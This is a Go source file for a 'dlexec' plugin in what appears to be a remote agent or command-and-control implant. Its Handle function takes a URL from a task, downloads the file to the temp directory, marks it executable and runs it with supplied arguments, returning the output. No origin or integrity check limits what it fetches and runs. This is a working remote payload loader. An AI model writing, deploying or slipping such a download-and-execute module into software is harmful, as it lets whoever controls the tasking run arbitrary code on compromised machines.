package agent

import (
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
)

type DlExecPlugin struct{}

type DlExecPluginArgs struct {
	URL  string   `json:"url"`
	Ext  string   `json:"ext"`
	Args []string `json:"args"`
}

type DlExecPluginResponse struct {
	Output  string `json:"output"`
	Status  string `json:"status"`
	Message string `json:"message"`
}

func NewDlExecPlugin() (*DlExecPlugin, error) {
	return &DlExecPlugin{}, nil
}

func (p *DlExecPlugin) Name() string {
	return "dlexec"
}

func (p *DlExecPlugin) Handle(task Task, sendStatusUpdate func(string)) (interface{}, error) {
	var args DlExecPluginArgs
	if err := json.Unmarshal(task.Data, &args); err != nil {
		sendStatusUpdate(fmt.Sprintf("Failed to parse args: %v", err))
		return &DlExecPluginResponse{
			Status:  "error",
			Message: fmt.Sprintf("Failed to parse args: %v", err),
			Output:  "",
		}, fmt.Errorf("Failed to parse args: %w", err)
	}

	filename := fmt.Sprintf("%s.%s", task.TaskID, args.Ext)
	sendStatusUpdate("Downloading file...")
	filePath, err := downloadFileToTemp(args.URL, filename)
	if err != nil {
		sendStatusUpdate(fmt.Sprintf("Failed to download file: %v", err))
		return &DlExecPluginResponse{
			Status:  "error",
			Message: fmt.Sprintf("Failed to download file: %v", err),
			Output:  "",
		}, fmt.Errorf("Failed to download file: %w", err)
	}
	defer os.Remove(filePath)

	err = os.Chmod(filePath, 0755)
	if err != nil {
		sendStatusUpdate(fmt.Sprintf("Failed to change file permissions: %v", err))
	}

	sendStatusUpdate("Executing downloaded file...")
	output, err := p.execCommand(filePath, args.Args)

	response := &DlExecPluginResponse{
		Status:  "success",
		Message: "",
		Output:  string(output),
	}

	if err != nil {
		sendStatusUpdate(fmt.Sprintf("Execution failed: %v", err))
		response.Status = "error"
		response.Message = fmt.Sprintf("%v", err)
		return response, fmt.Errorf("Failed to execute %v", err)
	}
	sendStatusUpdate("Execution succeeded")
	return response, nil
}

func (h *DlExecPlugin) execCommand(name string, args []string) ([]byte, error) {
	cmd := exec.Command(name, args...)
	output, err := cmd.CombinedOutput()
	if err != nil {
		return output, fmt.Errorf("failed to execute command %s %v", name, args)
	}
	fmt.Println(string(output))
	return output, nil
}

func downloadFileToTemp(url string, filename string) (string, error) {
	// Get the temporary directory
	tempDir := os.TempDir()

	// Create the full path for the file
	tempFilePath := filepath.Join(tempDir, filename)

	// Fetch the file
	resp, err := http.Get(url)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()

	// Check if the HTTP status is successful
	if resp.StatusCode != http.StatusOK {
		return "", fmt.Errorf("failed to download file: %s", resp.Status)
	}

	// Create the file in the temp directory
	outFile, err := os.Create(tempFilePath)
	if err != nil {
		return "", err
	}
	defer outFile.Close()

	// Copy the file content from the response body
	_, err = io.Copy(outFile, resp.Body)
	if err != nil {
		return "", err
	}

	return tempFilePath, nil
}
